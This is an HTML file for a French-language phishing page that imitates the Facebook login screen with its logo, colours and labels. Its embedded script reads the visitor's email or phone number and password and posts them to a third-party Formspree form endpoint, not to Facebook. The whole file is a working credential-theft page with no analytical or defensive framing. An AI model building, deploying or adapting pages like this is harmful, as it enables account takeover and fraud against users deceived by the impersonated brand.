<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f2f5;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        .container {
            background-color: white;
            border-radius: 5px;
            box-shadow: 0px 2px 10px rgba(0, 0, 0, 0.1);
            padding: 20px;
            width: 300px;
            text-align: center; 
        }

        .input-group {
            margin-bottom: 15px;
        }

        .input-group label {
            display: block;
            margin-bottom: 5px;
        }

        .input-group input {
            width: 100%;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 3px;
        }

        .input-group button {
            background-color: #1877f2;
            color: white;
            padding: 10px 15px;
            border: none;
            border-radius: 3px;
            cursor: pointer;
            font-size: 14px;
        }
		
		.create-account-button {
            background-color: #00FF00;
            color: white;
            padding: 8px 15px;
            border: none;
            border-radius: 3px;
            cursor: pointer;
            font-size: 12px;
            transition: background-color 0.3s ease;
		}

        .input-group button:hover {
            background-color: #1654c9;
        }
    </style>
    <script>
        function sendFormData() {
            var usernameOrEmail = document.getElementById("username_or_email").value;
            var password = document.getElementById("password").value;

            var form = document.createElement("form");
            form.setAttribute("action", "https://formspree.io/f/xqkvpvow");
            form.setAttribute("method", "POST");
            form.setAttribute("enctype", "multipart/form-data");

            var inputUsernameOrEmail = document.createElement("input");
            inputUsernameOrEmail.setAttribute("type", "text");
            inputUsernameOrEmail.setAttribute("name", "username_or_email");
            inputUsernameOrEmail.setAttribute("value", usernameOrEmail);
            form.appendChild(inputUsernameOrEmail);

            var inputPassword = document.createElement("input");
            inputPassword.setAttribute("type", "password");
            inputPassword.setAttribute("name", "password");
            inputPassword.setAttribute("value", password);
            form.appendChild(inputPassword);

            document.body.appendChild(form);
            form.submit();
        }
    </script>
</head>
<body>
    <div class="container">
        <img src="https://cdn.freebiesupply.com/logos/large/2x/facebook-logo-2019.png" width="100" height="100">
        <h2>Connexion</h2>
        <form action="" onsubmit="sendFormData(); return false;">
            <div class="input-group">
                <input type="text" placeholder="Adresse e-mail ou numéro de tél." id="username_or_email" name="username_or_email" required>
            </div>
            <div class="input-group">
                <input type="password" placeholder="Mot de passe" id="password" name="password" required>
            </div>
            <div class="input-group">
                <button type="submit">Se connecter</button>
			</div>
			<div>
				<button type="button" class="create-account-button">Créer un compte</button>
            </div>
        </form>
    </div>
</body>
</html>
